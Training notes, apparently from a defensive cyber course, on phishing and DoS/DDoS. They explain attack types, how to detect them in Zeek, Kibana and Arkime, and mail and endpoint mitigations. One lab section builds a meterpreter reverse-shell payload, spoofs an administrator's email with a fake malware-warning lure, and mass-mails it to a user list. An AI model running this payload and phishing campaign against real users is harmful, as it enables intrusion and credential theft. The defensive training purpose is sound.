# MOD 16
## Phishing Attacks and Defenses
### Phishing Attacks
- _Phishing is a cybercrime in which a target or targets are contacted by email, telephone, or text message by someone posing as a legitimate institution to lure individuals into providing sensitive data such as Personally Identifiable Information (PII), banking and credit card details, and passwords._
- Social engineering is an attack that exploits the human element of an organization’s security.
- Phishing is a subset of social engineering, which coerces users to divulge sensitive information or perform an action that they would not under normal circumstances, such as clicking on a malicious link or opening an attachment.
- Typically, attackers run phishing campaigns via email, however, other mediums such as phone calls or Short Messaging Service (SMS) have gained popularity as phishing platforms.
- **Spear phishing**, a targeted form of a phishing attack, is widely **used for initial access** as per MITRE, primarily due to ease and accessibility.
- Anyone can send fake emails, and several tools such as SET facilitate sending mass emails with little technical knowledge, making these attacks widely accessible.
- Script kiddies and nation-state actors alike have been known to initiate phishing attacks; a testament to their success.

### Types of Phishing Attacks
- Phishing is a broad principle of attack that has many avenues of approach. Some common types of phishing attacks include, but are not limited to:
   - Spear Phishing
      - This is a targeted form of phishing, in which the attacker tailors content specific to an organization, group, or individual.
      - In spear phishing, attackers conduct research on the target in order to make the attack more personalized and increase the likelihood of a successful phishing attack.
      - An example of a spear phishing attack: Dragonfly, a cyber espionage group, sent spear phishing emails to employees working on US power grids that contained malicious attachments in hopes of gaining initial access into those systems.
   - Whaling
      - Whaling is another targeted phishing attack that is aimed towards **high-profile targets**, such as individuals that are part of the C-level suite at an organization.
      - More effort and research goes into crafting of these emails due to the high returns for cybercriminals.
      - As higher level personnel often have more access to sensitive information or more authority, the payout of whaling attacks are potentially higher than other phishing attacks.
      - Whaling may have follow-on phishing attacks after the high-profile account is compromised, such as using the Chief Executive Officer’s (CEO) account to ask for a money transfer.
   - Vishing
      - Vishing refers to phishing scams that take place over the phone.
      - Comparatively, vishing has the most human interaction of all the phishing attacks but follows the same pattern of deception.
      - The malicious actor often creates a sense of urgency to convince a victim to divulge sensitive information and uses spoofed caller Identification (ID) to appear as a trustworthy source.
      - A typical scenario involves the attacker posing as a bank employee to flag up suspicious behavior on an account.
      - Once they have gained the victim’s trust, they ask for personal information such as login details, passwords, and Personal Identification Numbers (PIN).
      - The details are then used to empty bank accounts or commit identity fraud.
   - Smishing
      - Smishing is a type of phishing which uses SMS messages as opposed to emails to target individuals.
      - As smartphones gain more functionality, they also accumulate more vectors of attack. Similar to traditional email phishing, attackers can send malicious links, or use high pressure tactics to have users divulge sensitive information.
   - Clone Phishing
      - Clone phishing is a subset of a phishing attack that takes elements from an already sent legitimate email and replaces them with malicious counterparts.
      - This could include spoofing an email address to appear similar to the original sender, replacing a legitimate link with a malicious one, or claiming to be a resend of the original email. 

### Indicators of Phishing
- Attackers use several Techniques, Tactics, and Procedures (TTP) to conduct phishing campaigns. If a message contains some of these elements, then it may be part of a phishing attack.

#### Deceiving the Victim
- Attackers use several tactics to deceive the victim.
- This includes, but is not limited to, sending enticing messages, creating a sense of urgency, impersonating a trusted sender, and appealing to authority.

#### Sending Enticing Messages
- Lucrative offers and eye-catching or attention-grabbing statements are designed to attract people’s attention immediately.
- For instance, a message may claim that the intended victim won the lottery or that there is a hot single in the area waiting to meet.
- If the message sounds too good to be true, there is a strong chance that it is a phishing scam.
- Alternatively, something as simple as a link to a funny video or an interesting news article can be a phishing email as well.
- Attackers utilize seemingly endless amounts of tactics to entice users to click their malicious emails.

#### Creating a Sense of Urgency 
- Cybercriminals often create a sense of urgency by stating that their hook requires immediate action.
- Victims feel compelled to act quickly and, as a result, make worse decisions than they normally would.
- An example is stating that deals are only for a limited time, or that a personal account may be suspended immediately if the victim does not take action within a few minutes.
- When in doubt, the best course of action is to independently verify with the organization that there is an issue.

#### Impersonating a Trusted Sender 
- While it is possible to spoof email addresses under certain circumstances, it is also possible that legitimate email accounts are compromised and used in phishing campaigns.
- In the case that an email coming from a trusted source displays some phishing indicators, it is generally a good idea to independently verify with the organization/individual.
- Alternatively, attackers use domain names that are close to the domain that they are attempting to impersonate.
- For example, bankofarnerica.com looks similar to the legitimate domain bankofamerica.com, with the rn potentially passing as an m at first glance.

#### Appealing to Authority
- People are more likely to obey someone they perceive has some kind of authority.
- Common phishing attacks may impersonate organizations or figures of authority.
- Attackers may claim to be part of law enforcement, the Internal Revenue Service (IRS), or other government organization to make the victim more likely to cooperate.
- In DoD environments, pulling rank is a common method of trying to get things done by appealing to authority.
- As with trusted senders, independently verifying with the organization of authority is generally a good idea when in doubt.

### Phishing Email Contents
- Unless the purpose of the phishing attack was to simply elicit information from the victim, the attacker needs to deliver something in the content that has the capacity to execute code.
- In most cases, a user getting exploited simply by opening an email is unlikely.
- In the past, some mail clients allowed JavaScript, which brought the possibility of exploitation just from opening the email.
- Now, most modern email clients only allow for Hypertext Markup Language (HTML) or plain-text, which does not allow code execution.
- This would require a vulnerability in the mail client to implement, and is a rare occurrence albeit not impossible.
- More common methods used by attackers are malicious attachment files or getting the user to navigate to a malicious website by clicking a link.

#### Attachments
- Attachments in phishing emails often contain malicious payloads.
- In the past, a popular method was simply attaching an executable and attempting to convince a user to run it.
- As email filters become more and more sophisticated at protecting users from themselves by disallowing certain file types, attackers had to adapt.
- They now implement their code in more innocuous seeming file types.
- An attacker can easily embed JavaScript in a Portable Document Format (PDF) file or macros in Microsoft Office documents that execute once opened.

#### Links
- The sky is the limit once the victim decides to click on a hyperlink taking them to a location of the attacker’s choice.
- Since the attacker controls the website, they can initiate a variety of attacks here.
- Attackers can steal cookies, attempt to exploit the user’s browser, etc. A user can be exploited from just visiting a website.

### Other Indicators of Phishing
#### Misspellings and Grammatical Errors
- There are a few reasons for misspellings and typos in a phishing email.
- The most common sense reason is that the cybercriminals sending them may not be from English-speaking countries, thus do not have a good handle on the language.
- Another reason is that email filters look for specific strings in emails to make filtering decisions.
- If words are misspelled, then the email filter may allow the email to reach the user’s inbox.
- A more insidious reason for the prevalence of typos in phishing emails is that cyber criminals want to isolate the most gullible targets by sending overly ridiculous emails.

#### Unexpected Domain or Sender
- Attackers may use free email services or send emails from unexpected domain names.
- Phishing campaigns are initiated by attackers with a broad range of technical skill.
- Since the only thing needed for a phishing attack is an email address that can send emails, attackers often use free email services such as Gmail or Yahoo email accounts to send phishing emails. 

#### Unusual Email Headers
- Emails that have spoofed sender data may show inconsistencies in the email headers.
- Simple Mail Transport Protocol (SMTP) does not have mechanisms for validating email by default.
- If an attacker has access to their own mail server, they can control some of the data that goes in the email headers. Some fields that may help identify phishing attacks are:
   - Received-By: There may be multiple entries in this field.
      - Emails typically contain entries of all mail server hostnames and Internet Protocol (IP) addresses they have traversed to reach their final destination, similar to a traceroute.
      - The first destination in the chain, or the mail server that the attacker first relayed the mail to, may be a giveaway that the email is not legitimate.
   - Received-SPF: Sender Policy Framework (SPF) is an email security mechanism that allows administrators to specify allowed IP addresses and hostnames authorized to send mail on behalf of a domain.
      - An email with a spoofed sender may fail this check.
   - Authentication-Results: This field contains information related to Domain Key Identified Mail (DKIM), Domain-based Message Authentication Reporting and Conformance (DMARC), and SPF.
      - DKIM, DMARC, and SPF work together to provide email authentication.
      - If this field states that these checks did not pass, the user should rightfully be wary.
      - These protocols are discussed in more detail later in the lesson.
   - Return-Path: This is the field that specifies where messages that failed to send go.
      - This is required to be a real email address, and is often what email security protocols check.
      - Defenders can compare the Return-Path to the From field, which may reveal spoofing.

<img width="625" height="466" alt="c008a512-40fe-4588-891d-ceebcb36b53a" src="https://github.com/user-attachments/assets/c83e4fb1-2bc9-4bea-b4e1-178c9ff30d12" />

### Phishing Follow-On Actions
- Once the attacker successfully deceives the victim, follow-on actions typically include:

#### Gathering Data
- This attack does not deliver a payload in a technical sense.
- Victims divulge sensitive information, such as social security numbers, bank account numbers, and other PII. This can result in identity theft for the victim.

#### Harvesting Credentials
- Credential harvesting can be considered a subset of data gathering.
- Attackers attempt to gather login credentials, which could allow for follow-on attacks.
- A common phishing attack involves notifying users that their credentials were compromised, and to change their password by clicking on a link in the email.
- The link takes the victim to a site that impersonates the site’s login page. When users enter their credentials, the attacker collects them.

#### Executing Code
- An attacker may want more functionality after they successfully compromise a victim’s machine, which they can achieve via running their own specific code or running commands.
- If desired, they can deliver an exploit depending on the software, and/or drop a payload, if no exploit was needed (run reconnaissance surveys, etc.).
- Advanced Persistent Threat (APT) 28, or FANCY BEAR, is a Russian nation-state actor that has utilized phishing messages using spoofed websites to harvest credentials against their targets of interest in the US and Western Europe.

#### Conducting a Phishing Campaign
- Conduct a simple phishing campaign to gain insight into how one might be performed.
- Use the popular Mutt command line email client to send phishing emails with a standard meterpreter executable as the payload.
- Carry out a mass mailing campaign once they are successful with the requisite tasks.
1. Run the following commands to verify the Postfix service is functional: `sudo systemctl status postfix` and `sudo ss -lptn`
2. Create a malicous payload via msfvenom: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=199.63.64.51 LPORT=4444 -f exe-small -o attachment.exe`
   ` The options used in this command are:
   - -p: Specifies the desired payload. Since the target(s) in this domain are Windows 10 workstations, the appropriate payload is the 64-bit windows reverse TCP payload.
      - The reverse_tcp payload has the benefit of being better at circumventing end user host and network firewalls since the connection is initiated by the end user’s host device.
   - LHOST: This is the address that the exploited device calls back to.
   - LPORT: This is the port that the exploited device calls back to.
   - -f: This is the file format of the created payload. exe-small creates small Windows-compatible payloads.
   - -o: This option specifies the output file: attachment.exe.
3. Zip the payload: `zip attachment.zip attachment.exe`
4. Open _msfconsole_ in a new window
5. Run `use multi/handler`
6. Set your payload: `windows/x64/meterpreter/reverse_tcp` and show your options
7. Set up the listening host `set LHOST 0.0.0.0`, verify everything is correct, and then run `run -j` to start the listener as a job
8. From the other window, run the following to create a message for the email body: `echo 'This is your company administrator. Malware has been detected on your computer. Use the attached zip file to remove the virus immediately!' > message.txt`
9. Run the following to send the email with the attachment: `mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" phishme@cda.com -a attachment.zip < message.txt`
    - -e: Specifies a configuration option. This command spoofs the administrator’s email address by changing the contents of the From field.
    - -s: Subject line of the message
    - -a: Specifies a file to attach
    - phishme@cda.com: The recipient and the target of the attempted phish.
    - < message.txt: Redirects the contents of message.txt into the command, which sets the contents of the file as the message body.
10. Log into Outlook
11. Open up the email, download the malware and run it
12. Switch back to msfconsole window, a new _meterpreter_ session opened, run `session -i 1` to make an interactable session
13. Run `getuid` to see what it is running
14. Exit the session, and open a vim session for emails.txt: `vim emails.txt`
15. Run the following command to send emails to all users: `for email in $(cat emails.txt); do mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" $email -a attachment.zip < message.txt; done`
16. Run `sudo grep "status=sent" /var/log/mail.log` to verify the emails were successfully sent

### Phishing Attack Detection
- On a network, some indicators of phishing include:
   - Several emails coming from a single user: There may be a few reasons an attacker uses a single user to send several emails.
      - A compromised email account may be trustworthy in a specific domain.
      - Alternatively, creating an email account and sending mass emails is a trivial matter for attackers.
   - Several emails coming from a suspicious domain: Suspicious domains refer to either an unexpected domain (e.g., a free email service domain like Yahoo or Gmail).
      - External domains are inherently more suspicious than internal domains.
      - It can also refer to a domain that the attacker is attempting to impersonate.
   - Unusual email headers: Unusual email headers may give away a spoofed email address, though this practice is uncommon with modern day email authentication protocols.
- If there are phishing indicators on a network, then hunt for additional indicators of compromise within the mission partner’s networks.
- NIDS and Security Information and Event Management (SIEM) systems are helpful in detecting phishing attacks over a network.
- Observe some signs of a phishing attack occurring over the mission partner’s network using Kibana and Zeek logs.

### Detecting Phishing Emails
1. Enter Security Onion, and update your date range
   - Focus on Mail protocols, but below are lists of different ports/protocols:
     <img width="965" height="238" alt="9a1d98a0-a941-46d3-abd2-77434a84ccf7" src="https://github.com/user-attachments/assets/929deb68-bd59-4744-84e4-43496d39470f" />
     <img width="965" height="292" alt="15947c48-8813-4c09-bcdb-60e4e7ab6653" src="https://github.com/user-attachments/assets/6cf03c85-4b29-4822-8160-24f496e22618" />
     <img width="965" height="238" alt="8e34eee2-5674-45da-80b9-428e4a3247b6" src="https://github.com/user-attachments/assets/5c697950-c3c4-41a9-bf1e-d6655534a833" />
2. Filter down on SMTP
3. Open up the _Discover_ area in Kibana
4. Select the following fields to toggle:
   - _id: An Elasticsearch metadata field that assigns a unique index to an Elasticsearch document.
   - smtp.first_received: First host and IP address that received the message.
   - smtp.from: Displayed sender; this field can be spoofed.
   - smtp.mail_date: Contents of the date field.
   - smtp.mail_from: Real sender address; may differ from smtp.from.
   - smtp.path: Contains the mail servers traversed before the email reached its final destination. The first IP address is the final destination. This field is difficult to spoof as each mail server that the message traverses adds its information to this field.
   - smtp.recipient_to: Real recipient email that the message is sent to; may differ from smtp.to.
   - smtp.subject: Subject line of the email.
   - smtp.to: Displayed recipient.
5. Select the link in the _ _id _ field, and select the list and hex buttons to turn them off
6. Scroll to the bottom to see what was sent in the email.

### Defend against Phishing Emails
#### End User Training
- At an administrative level, user training and awareness is an effective measure in preventing phishing attacks.
- In 2018, the Data Breach Investigation Report from Verizon found that organizations reduced their phishing click rates from 25% to 3% over six years with periodic training (Carnegie Mellon Security blog).
- MITRE also calls out user training as an effective method of reducing the success rate of several social engineering attacks including phishing attempts.

#### Technical Controls
- Technical controls and user training both work together to reduce incidents related to phishing attacks.
- It only takes one click to get a foothold in a network, as seen during the phishing attack.
- Both are essential elements of a successful defensive security policy.
- Technical controls can be implemented in various parts of the network.

### Mitigations on the Network
#### Edge Transport Server
- This is a specific type of relay host in Microsoft Exchange architecture that external organizations send mail to.
- The Edge Transport Server has several mechanisms to screen emails before they are forwarded to the Exchange mailbox server.

#### Dedicated Spam-filtering Appliance
- Other vendors have appliances with comparable functionality to Edge Transport Servers, as far as screening mechanisms go.
- A popular dedicated spam appliance is Barracuda’s Spam Firewall. 

#### Web Application Firewall/Proxy
- Web application firewalls help protect against cases where a user attempts to navigate to a malicious link — including links that are included in phishing emails.
- Web application firewalls detect navigation to malicious domains, malicious network traffic, or Command and Control (C2) communications from infected hosts on the network.

### Mitigations on the Mail or Transport Server
- The mail server, or devices hosting mail-related services, are key places to implement phishing defenses.
- DoD networks typically utilize Microsoft Exchange services, so the following defenses have a heavy focus on Microsoft Exchange.
- Some of these defenses include:
   - **Anti-malware**: Microsoft Exchange has anti-malware features since Exchange 2013.
      - Outlook gets anti-malware definitions from the internet, and allows the mail administrator to specify the actions taken once mail matches a malware definition in a rule-based format.
      - The mail administrator specifies which recipients on the mail server the anti-malware scanning policy applies to.
   - **Spam Filter**: The spam filter in Exchange email architecture is enabled by default on Edge Transport Servers, but can be enabled on the mailbox server as well.
      - It is made of several components, some are discussed in this section.
   - **Content Filtering**: By default, content filtering is enabled and done on Edge Transport Servers but can be enabled on the mailbox server.
      - The Exchange confidence filter works by assigning a Spam Confidence Level (SCL) of 0-9 to a message based on words and phrases in the message, and the mail administrator can make a decision on what happens to the mail depending on the SCL.
   - **Attachment Filtering**: This feature is only available on Edge servers in Microsoft’s Exchange architecture. Attachment filtering works by examining the name, file extension, or MIME Content-Type and performing an action. The actions are either allow the message, allow the message but strip the attachment, or delete the message.
   - **Sender Filtering**: This feature is configurable on the mailbox server or Edge server.
      - Sender filtering is configured to block single users, whole domains, or subdomains.
   - **Sender ID**: This feature is configurable on the mailbox server or Edge server.
      - Sender ID protects against email spoofing by checking DNS for SPF records for authorized senders.
   - **Connection Filtering**: This feature is configurable on the mailbox server or Edge server.
      - Connection filtering allows blocking messages from the specific IP address of mail servers that the mail administrator does not want to receive mail from. SMTP connections are dropped if an IP address appears on the blacklist.
   - **Recipient Filtering**: This feature is configurable on the mailbox server or Edge server.
      - This feature allows mail administrators to specify restricted groups and groups that should not be able to receive mail from the internet.
      - It also allows mail administrators to specify what actions to take for non-existent users.

### Mitigations on the Endpoints
- As mentioned previously, two common methods of executing code are by getting users to open attachments, and getting users to click on links.
- Mitigations can be implemented to reduce the damage of either of those things happening.
   - **HBSS**: If a user saves an attachment (some mail clients provide the option of opening the attachment without saving it first) from a malicious email on disk, an **HBSS** may flag the malware and quarantine or remove it if it contains some qualities that the HBSS deems unsafe.
   - Some HBSS software has the capability to examine an attack in memory, which could prevent an attack if the user opens the attachment instead of saving it first.
   - Some HBSSs may also defend against web attacks. Enabling the HBSS and keeping signatures updated are good practices in defending against phishing attacks.
   - **Disabling Scripts and Macros**: If a user downloads an attachment with macros, or visits a site from a link with malicious script, it may lead to a compromise.
   - A good practice is to disable macros in documents by default.
   - In addition, most browsers have settings that disable JavaScript or other web-based content from running without explicit permission.
   - One caveat is that JavaScript is ubiquitous, and disabling it breaks functionality on several web servers.

### Other Miscellaneous Mitigations
- As briefly mentioned before, DKIM, SPF, and DMARC work together as email authentication protocols.
- Their individual purposes are as follows:
   - **DKIM**: DKIM uses PKI to sign emails leaving the sending server.
      - The receiving mail server verifies that the message is authentic and has not been altered in transit by using the public key published in the sending organization’s DNS records.
   - **SPF**: SPF publishes authorized mail servers and hostnames in a DNS record for the domain.
      - The receiving mail server checks the SPF record to ensure that the sending mail server is authorized to send mail on a domain’s behalf, usually based on the Return-Path field in the email header.
   - **DMARC**: DMARC utilizes the previous protocols and adds a reporting feature on top. It allows domain owners to see who is sending emails on their behalf.
- Implementing these protocols has a two-fold benefit of preventing attackers from spoofing a domain owner’s domain, thus preventing emails from appearing as if they originated inside the organization, and using the domain owner’s domain in phishing attacks against other organizations.
- If attackers are unable to spoof an organization’s domain, then users are more certain of an email message’s origin and make better informed decisions based on the domain.

### Implementing Technical Phishing Defenses
1. Open _Exchange Management Shell_
2. Check status of anti-malware service by running `Get-TransportAgent "Malware Agent"`
3. Open the _Exchange Administrative Center_
4. Select _Protection_ and then the + to define a new anti-malware policy
5. Flll out the information for _Name, Description, and Malware Detection Response_
6. Scroll down to _Applied to_ section, and select _The recipient domain is_
7. Select the Domains that you want, click _add ->_ and then click save.
8. Run `Get-SenderFilterConfig` to get a config of the sender filter
9. Enable this via `Set-SenderFilterConfig -Enabled $true`
10. Block known malicous emails via `Set-SenderFilterConfig -BlockedSenders attacker@internet.com`
11. Block bad domain via `Set-SenderFilterConfig -BlockedDomainAndSubdomains baddomain.com`
12. Verify the Config
13. Move over to the user host to configure security policies
14. Open Word, then select _Word Options > Trust Center_
15. Select _Trust Center Settings_, then _Macro Settings_; change the setting to _Disable all macros without notification_
16. Open _Windows Defender Settings_ and ensure that the following are selected _Real-Time Protection: **On**; Cloud-Based Protection: **OFF**; Automatic Sample Submission: **OFF**; Enhanced Notifications: **ON**_

### Phishing Attack and Defense
1. 


# MOD 17
## DDOS Attacks & Defenses
### What is a DoS/DDoS Attack?
- _The Cybersecurity and Infrastructure Security Agency (CISA) defines a DoS Attack as an attack that has occurred when legitimate users are unable to access information systems, devices, or other network resources due to the actions of a malicious cyber threat actor._
- This loss of access can range from a **single service or machine** being inaccessible, up to an entire network.
- There are many different categories of DoS attacks, each with their own characteristics and varying degrees of impact.
- A **DDoS** attack is the same as a DoS, but is launched from **more than one attacker-controlled host**.
- Hosts used in a DDoS might be a from a large amount of attackers coordinating their attack, or from an army of unwitting bots under the control of a single attacker.

### Types of DoS/DDoS Attacks
#### Saturation
- On May 12, 2021, CDA.com external trainers mentioned issues accessing the new websites.
- Upon investigation in Arkime, network defenders noticed a significant spike in total data inbound from the internet, but found that the overall packet/session count was low.
- It appeared that a threat actor was trying to saturate the dedicated connection between these servers and the internet.

#### Volume Attacks
- Volume attacks are a type of DoS attack intended to **saturate** (i.e., use up) all the bandwidth available to an attacked site, host, or network segment.
- Volume attacks are very dependent upon the **overall connection bandwidth** of the target — a website hosted via a Digital Subscriber Line (DSL) link is easier to overwhelm than a website hosted via a cloud provider.
- An attacker with a **100 Megabits Per Second (Mbps) cable connection** may be able to overwhelm a DSL-hosted site, but a larger pooled-bandwidth attack is needed in order to overwhelm a cloud provider.
- Alternatively, a large-scale DDoS attack may be able to overwhelm the cloud provider.

#### Viewing this attack
1. Open up **arkime** and log in
2. Select _Packets_
3. Adjust timeframe to the desired timeline
4. Hone in on the timeframe of the Spike
5. Scroll down and expand the packet of interest
   - NOTE: This is a capture of a Low Orbit Ion Cannon (LOIC) executing a default UDP DDoS attack from 104.53.222.21. LOIC is an open-source network stress testing tool that can be used to perform a denial-of-service attack.

     <img width="1397" height="549" alt="4857a814-aebc-4426-9b12-ce58c5d06775" src="https://github.com/user-attachments/assets/d079d88a-5dd1-4a8d-ba24-df8b88de9ffa" />

### Pivoting to Zeek
- Since the Arkime and Security Onion sensors have overlapping coverage of the network traffic, the defenders can pivot to Security Onion with the information gleaned from the Arkime findings
- Zeek logs are flat text files that are created on the network sensor.
  - These files are then ingested into Elastic where they can be queried using the Kibana interface.
  - Defenders can also query the Zeek logs directly on the sensor, but Kibana allows for a full view of all of the Zeek sensor output in one location.
1. Open up Kibana
2. Update your timeframe to the time of the attack
3. Filter down on zeek logs
4. Filter to only display the IP's external (`source.ip:104.53.222.1/24 AND destination.ip:104.53.222.1/24` in this case)
5. Filter for `zeek weird logs`
6. Update filter to add the Source and Dest Ports in question

### UDP Flood
- The multitude of UDP seen in the previous tasks is symptomatic of a volume-based UDP flood.
- In this case, the amount of packets was not enough to deny any service, but the attacker’s intent was clearly to do so.
- With only a single host attempting DoS, it is simple enough to set up a firewall rule to block the traffic.
- In a UDP flood, an attacker sends a plethora of UDP datagrams to a target.
- When the target receives the datagrams, it looks for an application associated with that port.
- If nothing is found, the target responds with a destination unreachable Internet Control Message Protocol (ICMP) packet.
- If the attacker sends more of these packets, they may eventually overwhelm the bandwidth of the target's network stack.
- UDP floods are frequently used against services like DNS or Voice over Internet Protocol (VoIP) to saturate the network stack on the target.
- The attacker can also utilize UDP datagrams to trick a host into performing a DoS against a different host.
- By spoofing the source IP of the UDP datagrams, all destination unreachable ICMP responses from one host are sent to the spoofed source IP, which never actually sent any traffic.
- Additionally, this can be further magnified if an attacker coordinates multiple systems (such as through a botnet) to deliver UDP flood attacks against a multitude of hosts at the same time — with them all spoofing the same source IP address.
- This tactic is known as a Distributed Reflective Denial of Service (DRDoS) attack.
- DoS attacks can also be described as amplified when the request for data is much smaller than the actual response.
- For example, if an attacker sent a request for all the DNS entries associated with isc.org, it would be a request of around 64 bytes.
- The response would be over 3,000 bytes, which would net an amplification 50 times higher based on the initial request.
- These types of attacks are very lucrative for attackers who are trying to overwhelm the bandwidth of a victim.

### ECHO ECHO ECHO
- CDA.com administrators also noted a spike in ICMP traffic within Arkime around 08:00 on May 12, 2021.
- The defender searched for `ip.protocol == icmp` within Arkime and was able to spot a spike in the session counts in the timeline.
- The following steps can be followed in order to analyze this spike.
  1. Adjust timeframe in Arkime
  2. Filter for `ip.protocol == icmp`

### ICMP Flood
- In an ICMP — or Ping — flood, an attacker overwhelms a target’s computer with ICMP echo requests, which are also known as pings.
- ICMP floods are generally a one-for-one packet — each packet sent by the attacker is met with a responding packet from the target.
- Because the attacker has to send more packets than the target can handle, this degrades the attacker's network connection as well as the target's.
- The attacker can spoof the source address so that the target does not respond directly to the attacker, but the attacker must still send enough traffic to overwhelm the target.
- The target thus receives echo requests and responds with echo replies, while the attacker only sends echo requests. The unwitting spoofed source IP receives unsolicited ping replies, as well.
- ICMP Type 8 for this attack

#### Indicators
  - Large quantity of ICMP packets with large byte count

#### Mitigations/Countermeasures
  - Block or drop ICMP messages from particular IP addresses
  - Block or drop all ICMP packets from Wide Area Networks (WAN)

### Protocol Attacks
- Protocol DoS/DDoS attacks are similar to volume-based attacks, but have one key difference — protocol attacks overflow other resources available on the network device, rather than just the bandwidth.
- Examples of resources that may be affected during a protocol attack are resources like **memory**, **Process Identifiers (PID)**, **ports**, or **sockets**.


#### Description
- DDoS attacks have the ability to overwhelm a target just by the sheer volume of requests.
- In protocol attacks, bandwidth usage remains within normal ranges, but the overall request count is still abnormally high.
- These requests consume all available connections, PIDs, or other resources needed by the servicing application, resulting in valid users being unable to access or use the service.
- An analogy for this behavior would be having an entire school of students going to a fast food restaurant at the same time, but instead of ordering they are just asking questions about the menu when they get to the front of the line.
- Though some normal hungry patrons may make it to the front of the line eventually, the students are keeping all of the employees busy with questions.
- Eventually, the employees realize what the students are up to and send them all away, but until then, the establishment makes no money.

#### Indicators
  - Marked increase in requests to a host over baseline External site access time monitoring

#### Mitigations/Countermeasures
- Partition mission essential traffic via filter or Quality of Service controls
- Partition critical services from other online services or create load balanced capability for service

### Ping of Death Fragmentation Attack
- The Ping of Death fragmentation attack attempts to build an IP packet larger than maximum allowed size of 65,535 bytes.
- The attacker sends many smaller fragments of a packet, but when reassembled on the target host, the combined size of the IP datagram is over the maximum size. This leads to a crash, hang, or reboot on the target host.
- Modern OSs are all patched and no longer vulnerable to this type of attack, but depending on the volume of traffic, a Ping of Death could slow or stop legitimate traffic like the previously discussed volume-based attacks.

#### Indicators
- ICMP packets with very large payloadsNon-standard payload sections

#### Mitigations/Countermeasures
- All modern OSs have patches in place that defeat this attack, but be aware that any old, unpatched OSs should be filtered from receiving ping requests.

### Knock
- Defenders continue to look for more information associated with these DoS attempts against their newly provisioned web servers.
- The attackers were not overly successful, but they were persistent.
- Pivot over to the Kibana dashboard to analyze Zeek logs, and pinpoint TCP connections that only sent a Synchronize (SYN) request from the source, but not an Acknowledgment (ACK) response.
  1. Open Kibana, and click on the _Network_ Event Category
  2. Select _Connections_
  3. Modify timeframe as required
  4. Look at all of the _Security Onion - Connections - State_ pane
- Below is a list of Connection States:
  - **S0**: Connection attempt seen; no reply.S1: Connection established; not terminated.
  - **SF**: Normal establishment and termination. Note that this is the same symbol as for state S1. You can tell the two apart because for S1 there are not any byte counts in the summary, while there are for SF.
  - **REJ**: Connection attempt rejected.
  - **S2**: Connection established and close attempt by originator seen, but no reply from responder.
  - **S3**: Connection established and close attempt by responder seen, but no reply from originator.
  - **RSTO**: Connection established, originator aborted; sent a Reset (RST).
  - **RSTR**: Responder sent a RST.RSTOS0: Originator sent a SYN followed by a RST; never saw a SYN-ACK from the responder.
  - **RSTRH**: Responder sent a SYN ACK followed by a RST; never saw a SYN from the (purported) originator.
  - **SH**: Originator sent a SYN followed by a Final (FIN); never saw a SYN ACK from the responder — hence the connection was half open.
  - **SHR**: Responder sent a SYN ACK followed by a FIN; never saw a SYN from the originator.
  - **OTH**: No SYN seen, just midstream traffic. One example of this is a partial connection that was not closed later.
  5. Look at the _Security Onion - Connections - History_ pane
- Zeek contains info about cnnection history:
  - **S**: The originator sent a SYN segment.
  - **h**: The responder sent a SYN ACK segment.
  - **A** The originator sent an ACK segment.
  - **D**: The originator sent at least one segment with payload data. In this case, that was HTTP over TCP.
  - **a**: The responder replied with an ACK segment.
  - **d**: The responder replied with at least one segment with payload data.
  - **F**: The originator sent a FIN ACK segment.
  - **f**: The responder replied with a FIN ACK segment.
  6. Filter down on the **S**.
  7. Look at the Source/Destination IP fields
  8. Filter on specified IP
- This traffic is indicative of a SYN flood attack, which is discussed in the next task.
- Reviewing the Source IP addresses shows multiple hosts associated with this attack.
- This could be a misstep by the attacker or a disregard for Operations Security (OPSEC) because the originators are part of a larger group of bots.
- It is interesting that the IP address 104.53.222.1 is listed as the second-highest count — this may indicate an upstream route has been compromised.
  9. Go back to Arkime and filter for `tcpflags.syn == 1 && tcpflags.ack == 0 && ip.src == 104.53.222.1`

### SYN Flood Attack
- A SYN flood uses the three-way TCP handshake to consume ports on a target.
- An attacker sends a SYN packet with a spoofed source IP to a port with an active listener (e.g., Apache, Simple Mail Transfer Protocol [SMTP]) on the target.
- The target responds with a SYN/ACK packet to acknowledge the connection, but sends the SYN/ACK to the spoofed IP, which never responds as it did not initiate the connection.
- The target holds the TCP socket and port open, waiting for the response, until it reaches an internal timeout threshold. The attacker can send tens of thousands of these requests to try to use up all the available ports/sockets on the host and deny legitimate users access to the host.
- This attack is also known as a half-open attack because the three-way TCP handshake is only left half complete.

#### Indicators
- Monitor network flow for traffic that has a SYN, SYN ACK, or ACK only Connection State (conn_state)
  - **Arkime**: `tcpflags.syn-ack != 1 && tcpflags.syn == 1`
  - **Zeek**: `connection.state:S0`

#### Mitigations/Countermeasures
- Modern OSs have a maximum number of half-open connections allowed to thwart this behavior.

### Overlapping Fragmented Packets Attacks
- In networking, packet fragmentation happens all the time. Packets pass across different types of networks that may have varying Maximum Transmission Units (MTU).
- For example, a packet that leaves a Fiber Distributed Data Interface (FDDI) network could have up to 4,352 bytes in a single packet — an MTU of 4,352.
- When the packet needs to transit an Ethernet network, which only has an MTU of 1,500, the packets must be fragmented down to the new maximum size of 1,500 bytes or less.
- The fragmented packets are then reassembled back into the original datagram by the receiving host.
- Attackers use this knowledge to try to overwhelm receiving hosts by constructing packets that are fragmented in hard-to-reconstruct ways, such as with overlapping offsets or completely overlapping fragments.
- Internet Protocol version 4 (IPv4) also sets a 4.25-minute timeout on packet reconstruction — meaning that the recipient waits for missing fragments for up to 4.25 minutes. Attackers can abuse this window to block more resources for a period of time.
- Overlapping fragments are also used as a way to bypass Intrusion Detection Systems (IDS).
- Each OS deals with fragmentation differently, which can cause packets designed for exploitation to be reassembled differently depending on the underlying OS.
- If six packets are sent with the same Identifier (ID) and different offsets:

  <img width="624" height="270" alt="69838fa9-d100-4a6e-a3f4-abfa6f2c0a5b" src="https://github.com/user-attachments/assets/b058ba8f-9c86-4d38-8731-9f14d3ff571d" />

- …they can be reassembled with vastly different data on the distant end

  <img width="622" height="270" alt="80ef12ba-c11b-4912-8941-d02c7fcfa2e4" src="https://github.com/user-attachments/assets/e123c869-d5f0-4bb1-a407-dde11e41013a" />

#### Simulation
<img width="634" height="168" alt="image" src="https://github.com/user-attachments/assets/00a71bca-5979-4a68-b38b-0c98ceba7282" />

#### Indicators
- Devices rebooting after subsequent packets with more fragment flag setsFrag preprocessor in Snort or Suricata

#### Mitigations/Countermeasures
- Most modern OSs are patched, but check Internet of Things (IoT) devices and segment them from the rest of the network as much as possible
